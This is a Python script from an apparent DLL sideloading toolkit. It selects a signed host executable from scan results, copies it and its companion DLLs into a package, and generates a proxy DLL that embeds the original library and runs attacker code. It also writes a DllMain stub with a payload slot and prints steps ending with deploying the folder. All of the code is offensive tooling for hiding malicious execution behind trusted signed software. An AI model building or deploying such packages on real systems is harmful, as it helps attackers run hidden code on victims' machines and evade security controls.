#!/usr/bin/env python3
"""
Package Builder — turn a scan target into a deployable sideloading bundle.

Takes scan results from scan.py (JSON) and builds a self-contained folder:
  package/
    legit_signed.exe          # copied from installed software
    target.dll                # our proxy (embeds original, runs payload)
    [companion DLLs]          # other local DLLs the EXE needs

Usage:
  python package.py targets.json --pick 0                   # build top target
  python package.py targets.json --pick 0 --compiler msvc   # MSVC only
  python package.py --exe path/to/app.exe --dll version.dll # manual target
"""

import argparse
import json
import shutil
import subprocess
import sys
from pathlib import Path


def load_target(scan_json: str, index: int) -> dict:
    with open(scan_json, "r", encoding="utf-8") as f:
        data = json.load(f)
    candidates = data["candidates"]
    if index < 0 or index >= len(candidates):
        print(f"[-] Index {index} out of range (0..{len(candidates)-1})")
        sys.exit(1)
    return candidates[index]


def resolve_source_dll(exe_path: str, dll_name: str, source_dll: str) -> str:
    """Find the real DLL to use for proxy generation."""
    if source_dll and Path(source_dll).is_file():
        return source_dll
    # Try beside the EXE
    local = Path(exe_path).parent / dll_name
    if local.is_file():
        return str(local)
    # Try System32
    windir = Path(__import__('os').environ.get("WINDIR", r"C:\Windows"))
    for sys_dir in [windir / "System32", windir / "SysWOW64"]:
        p = sys_dir / dll_name
        if p.is_file():
            return str(p)
    return ""


def build_package(
    exe_path: str,
    dll_name: str,
    source_dll: str,
    vector: str,
    companion_dlls: list[str],
    compiler: str,
    output_dir: Path,
):
    output_dir.mkdir(parents=True, exist_ok=True)
    exe_src = Path(exe_path)
    exe_dir = exe_src.parent

    # ── 1. Copy the host EXE ──
    exe_dst = output_dir / exe_src.name
    print(f"[*] Copying EXE: {exe_src.name}")
    shutil.copy2(str(exe_src), str(exe_dst))

    # ── 2. Copy companion DLLs ──
    for comp in companion_dlls:
        comp_src = exe_dir / comp
        if comp_src.is_file():
            print(f"[*] Copying companion: {comp}")
            shutil.copy2(str(comp_src), str(output_dir / comp))
        else:
            print(f"[!] Companion not found: {comp} (EXE may still work without it)")

    # ── 3. Generate proxy DLL ──
    if not source_dll:
        print(f"[!] No source DLL for '{dll_name}' — generating empty stub")
        _generate_stub(dll_name, output_dir)
        return

    print(f"[*] Generating proxy for: {dll_name}")
    gen_script = str(Path(__file__).parent / "generate.py")
    proxy_out = output_dir / "_proxy_build"

    cmd = [
        sys.executable, gen_script, source_dll,
        "--payload", "--embed", "--block",
        "--compiler", compiler,
        "-o", str(proxy_out),
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[-] generate.py failed:\n{result.stderr}")
        sys.exit(1)

    # ── 4. Move build files into package ──
    build_dir = output_dir / "build"
    if proxy_out.exists():
        proxy_out.rename(build_dir)

    print(f"\n[+] Package ready: {output_dir.resolve()}")
    print(f"    {exe_src.name:<30} <- legit signed EXE")
    if companion_dlls:
        for comp in companion_dlls:
            print(f"    {comp:<30} <- companion DLL (copied)")
    print(f"    build/<proxy files>           <- compile, then copy {dll_name} here")
    print(f"\n[*] Next steps:")
    print(f"    1. cd {build_dir}")
    print(f"    2. Edit payload.c with your code")
    if compiler in ("msvc", "both"):
        print(f"    3. build_msvc.bat")
    if compiler in ("gcc", "both"):
        print(f"    3. make")
    print(f"    4. Copy the built {dll_name} to {output_dir}")
    print(f"    5. Deploy the folder")


def _generate_stub(dll_name: str, output_dir: Path):
    """Generate a minimal DLL stub for phantom imports."""
    stub_c = output_dir / "stub.c"
    stub_c.write_text(
        '#include <windows.h>\n'
        'BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {\n'
        '    (void)h; (void)r;\n'
        '    if (reason == DLL_PROCESS_ATTACH) {\n'
        '        /* payload here */\n'
        '    }\n'
        '    return TRUE;\n'
        '}\n',
        encoding="utf-8",
    )
    print(f"[+] Stub source written to {stub_c}")
    print(f"    Compile: cl /LD stub.c /link /OUT:{dll_name}")


def main():
    parser = argparse.ArgumentParser(
        description="Build a sideloading deployment package",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    # From scan results
    parser.add_argument("scan_json", nargs="?", help="Scan results JSON from scan.py")
    parser.add_argument("--pick", type=int, default=0, help="Target index from scan results (default: 0 = top)")
    parser.add_argument("--list", action="store_true", help="List targets in scan JSON")

    # Manual target
    parser.add_argument("--exe", type=str, help="Direct: path to host EXE")
    parser.add_argument("--dll", type=str, help="Direct: DLL name to proxy")
    parser.add_argument("--source-dll", type=str, default="", help="Direct: path to real DLL")

    # Build options
    parser.add_argument("--compiler", choices=["msvc", "gcc", "both"], default="both")
    parser.add_argument("-o", "--output", type=str, default=None, help="Output directory")

    args = parser.parse_args()

    # ── List mode ──
    if args.list and args.scan_json:
        with open(args.scan_json, "r", encoding="utf-8") as f:
            data = json.load(f)
        print(f"\n {'#':>4}  {'SCORE':>5}  {'VEC':3} {'ARC':3}  {'DLL':<28} {'COMP':>4}  EXE")
        print(f" {'-'*4}  {'-'*5}  {'-'*3} {'-'*3}  {'-'*28} {'-'*4}  {'-'*35}")
        for i, c in enumerate(data["candidates"]):
            vec = {"replace": "RPL", "search_order": "SRO", "phantom": "PHT"}[c["vector"]]
            comp = len(c.get("companion_dlls", []))
            sig = "S" if c.get("exe_signed") else " "
            print(f" {i:>4}  {c['score']:>4}{sig} {vec:3} {c['arch']:3}  "
                  f"{c['dll_name']:<28} {comp:>4}  {c['exe_path']}")
        print()
        return

    # ── Resolve target ──
    if args.exe and args.dll:
        exe_path = args.exe
        dll_name = args.dll
        source_dll = args.source_dll or resolve_source_dll(exe_path, dll_name, "")
        vector = "replace" if source_dll and Path(exe_path).parent in Path(source_dll).parents else "search_order"
        companion_dlls = []
    elif args.scan_json:
        target = load_target(args.scan_json, args.pick)
        exe_path = target["exe_path"]
        dll_name = target["dll_name"]
        source_dll = resolve_source_dll(exe_path, dll_name, target.get("source_dll", ""))
        vector = target["vector"]
        companion_dlls = target.get("companion_dlls", [])
        print(f"[*] Target #{args.pick}: {Path(exe_path).name} + {dll_name} "
              f"(score {target['score']}, {vector})")
    else:
        parser.error("Provide scan_json or --exe + --dll")
        return

    if not Path(exe_path).is_file():
        print(f"[-] EXE not found: {exe_path}")
        sys.exit(1)

    # ── Output directory ──
    if args.output:
        output_dir = Path(args.output)
    else:
        exe_stem = Path(exe_path).stem.lower().replace(" ", "_")
        output_dir = Path("output") / f"pkg_{exe_stem}"

    build_package(
        exe_path=exe_path,
        dll_name=dll_name,
        source_dll=source_dll,
        vector=vector,
        companion_dlls=companion_dlls,
        compiler=args.compiler,
        output_dir=output_dir,
    )


if __name__ == "__main__":
    main()
